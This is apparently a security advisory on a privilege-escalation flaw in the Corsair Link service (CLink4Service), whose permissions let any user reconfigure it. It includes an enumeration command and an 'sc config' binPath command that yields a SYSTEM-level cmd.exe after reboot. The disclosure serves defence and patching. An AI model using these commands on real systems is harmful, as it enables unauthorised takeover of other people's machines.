Product Version: Corsair Link Version 4.9.7.35 
Downloaded from: https://www.corsair.com/us/en/downloads

Operating System tested on: Windows 10 1803 (x64)

Vulnerability: Corsair Link Service Permission Elevation of Privilege 

Brief Description: The Corsair Link Service (CLink4Service) has an insecure DACL that allows low privileged users “GenericAll” over the service, resulting in elevation of privilege to “NT AUTHORITY\SYSTEM”

Vulnerability Explanation:

The Corsair Link software has a service called “CLink4Service” that grants any user full control over the service:

C:\Users\lowpriv> Get-AccessibleService -Name "CLink4Service"

TokenId Access        Name
------- ------        ----
E1E61   GenericAll    CLink4Service



By granting “GenericAll” to any user, a low privileged process can simply change the binPath of the service to any binary with any parameters:

C:\Users\lowpriv> sc config CLink4Service binPath= "C:\Windows\System32\cmd.exe /c cmd.exe"
[SC] ChangeServiceConfig SUCCESS

After rebooting, cmd.exe will be running as “NT AUTHORITY\SYSTEM”
